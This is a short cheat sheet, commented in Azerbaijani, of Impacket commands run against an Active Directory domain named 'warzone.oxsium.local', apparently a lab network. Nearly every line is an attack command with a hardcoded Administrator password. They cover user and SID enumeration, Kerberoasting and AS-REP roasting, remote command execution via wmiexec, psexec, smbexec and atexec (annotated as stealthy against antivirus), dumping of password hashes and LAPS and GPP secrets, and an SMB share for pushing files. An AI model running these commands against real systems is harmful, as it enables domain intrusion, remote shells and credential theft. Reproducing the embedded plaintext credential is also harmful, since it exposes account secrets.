# --- [ İLKİN KƏŞF VƏ MƏLUMAT TOPLAMA ] ---

# Domaindəki bütün istifadəçiləri və detallarını çəkmək
python3 GetADUsers.py -all -dc-ip 192.168.0.239 warzone.oxsium.local/Administrator:sako2005!

# SID Enumeration (Bütün userlərin SİD nömrələri ilə tapılması)
python3 lookupsid.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239

# Domain-də Delegasiya konfiqurasiyalarını (zəiflikləri) axtarmaq
python3 findDelegation.py warzone.oxsium.local/Administrator:sako2005! -dc-ip 192.168.0.239

# --- [ KERBEROS HÜCUMLARI ] ---

# Kerberoasting (TGS biletlərini çəkib fayla yazmaq)
python3 GetUserSPNs.py warzone.oxsium.local/Administrator:sako2005! -dc-ip 192.168.0.239 -request -outputfile kerb_hashes.txt

# AS-REP Roasting (Pre-auth söndürülmüş userləri tapmaq)
python3 GetNPUsers.py warzone.oxsium.local/Administrator:sako2005! -dc-ip 192.168.0.239 -request -format hashcat

# TGT Bileti almaq (Pass-the-Ticket üçün)
python3 getTGT.py -dc-ip 192.168.0.239 warzone.oxsium.local/Administrator:sako2005!

# --- [ SİSTEMƏ GİRİŞ VƏ ƏMR İCRA ETMƏK ] ---

# WMIExec (Antiviruslara qarşı gizli və sürətli terminal)
python3 wmiexec.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239

# PSExec (Tam interaktiv SYSTEM səviyyəli giriş)
python3 psexec.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239

# SMBExec (Service yaratmadan, gizli əmr icrası)
python3 smbexec.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239

# ATExec (Task Scheduler vasitəsilə əmr icrası)
python3 atexec.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239 "whoami /all"

# --- [ MƏLUMAT SIZDIRMA (POST-EXPLOITATION) ] ---

# SecretsDump (Bütün şifrə heşlərini RAM və NTDS-dən çəkmək)
python3 secretsdump.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239

# LAPS Şifrələrini oxumaq (Əgər sistemdə aktivdirsə)
python3 GetLAPSPassword.py warzone.oxsium.local/Administrator:sako2005! -dc-ip 192.168.0.239

# GPP (Group Policy Preferences) daxilindəki şifrələri tapmaq
python3 Get-GPPPassword.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239

# --- [ ŞƏBƏKƏ VƏ DİGƏR SERVİSLƏR ] ---

# MSSQL Client (Verilənlər bazası üzərindən əmr icrası)
python3 mssqlclient.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239 -windows-auth

# SMB Server (Kali-dən hədəf maşına fayl ötürmək üçün saxta qovluq açmaq)
python3 smbserver.py lab_share $(pwd) -smb2support

# RPC Map (Hədəf sistemdəki RPC portlarının siyahısı)
python3 rpcmap.py -brute 192.168.0.239
